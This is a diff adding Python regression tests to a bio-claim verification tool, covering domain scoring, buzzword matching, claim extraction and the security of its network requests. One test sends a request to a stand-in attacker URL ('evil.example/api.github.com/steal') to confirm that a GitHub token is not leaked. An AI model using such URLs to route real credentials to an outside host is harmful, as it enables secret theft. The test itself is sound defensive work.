@@ -261,3 +261,88 @@ class TestFileOutputs(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestRemainingReviewFindings(unittest.TestCase):
+    def test_domain_ties_do_not_default_to_technology(self):
+        """Ties resolved by dict order, and technology is declared first — so any
+        mixed-field professional was pulled into the domain scored hardest."""
+        from larp_meter import domains as dom
+        prof = {"technology": {"claims": ["hardware"], "credentials": [], "roles": []},
+                "finance": {"claims": ["hedge fund"], "credentials": [], "roles": ["trader"]}}
+        self.assertEqual(dom._top(prof, "claims")[0], "finance")  # role support breaks the tie
+
+    def test_reporting_on_a_field_is_not_claiming_to_work_in_it(self):
+        text = ("Technology journalist covering artificial intelligence and semiconductor "
+                "hardware. MA in journalism, University of Ghent, 2012. Ten years as a "
+                "reporter and press officer.")
+        self.assertEqual(flag(text, 1)["status"], PASSED)
+
+    def test_but_a_senior_title_in_the_domain_still_counts_as_a_claim(self):
+        text = ("Chief Medical Officer of Helix Diagnostics, delivering clinical treatment and "
+                "patient care. MBA in management. Former account manager and press officer.")
+        self.assertEqual(flag(text, 1)["status"], TRIGGERED)
+
+    def test_nested_buzzwords_are_counted_once(self):
+        from larp_meter.matching import find_non_overlapping
+        distinct, hits = find_non_overlapping("A true paradigm shift.",
+                                              ["paradigm", "paradigm shift"])
+        self.assertEqual((distinct, hits), (["paradigm shift"], 1))
+
+    def test_honorifics_are_not_partner_organizations(self):
+        claims = ex.extract_claims("Partnership with Dr. Smith and partnership with Orion Systems.")
+        self.assertEqual([c.value for c in ex.claims_by(claims, "partnership", "partner_org")],
+                         ["Orion Systems"])
+
+    def test_arxiv_is_queried_over_tls(self):
+        """On plaintext an on-path attacker could forge an attribution result."""
+        v = StubVerifier({})
+        claim = Claim(kind="artifact", subtype="arxiv", value="2101.00001")
+        v.verify_arxiv(claim)
+        self.assertTrue(v.requested and v.requested[0].startswith("https://"))
+
+    def test_github_token_is_never_sent_to_another_host(self):
+        """The token was attached on a substring test of the whole URL, so a
+        path or query containing the API hostname leaked the credential."""
+        import os
+        import urllib.request
+        from larp_meter.verify import Verifier
+
+        captured = []
+
+        class FakeResponse:
+            headers = {"Content-Type": "application/json"}
+
+            def read(self, *a):
+                return b"{}"
+
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        def fake_urlopen(req, timeout=None):
+            captured.append((req.full_url, dict(req.headers)))
+            return FakeResponse()
+
+        real_urlopen = urllib.request.urlopen
+        os.environ["GITHUB_TOKEN"] = "secret-token"
+        urllib.request.urlopen = fake_urlopen
+        try:
+            v = Verifier(tempfile.mkdtemp())
+            v._get("https://evil.example/api.github.com/steal")
+            v._get("https://api.github.com/users/someone")
+        finally:
+            urllib.request.urlopen = real_urlopen
+            os.environ.pop("GITHUB_TOKEN", None)
+
+        headers_by_host = {url: hdrs for url, hdrs in captured}
+        evil = headers_by_host["https://evil.example/api.github.com/steal"]
+        good = headers_by_host["https://api.github.com/users/someone"]
+        self.assertNotIn("Authorization", {k.title(): v for k, v in evil.items()})
+        self.assertIn("Authorization", {k.title(): v for k, v in good.items()})
+
+    def test_user_errors_are_messages_not_tracebacks(self):
+        from larp_meter.cli import main
+        self.assertEqual(main(["--file", "/definitely/not/here.txt"]), 2)
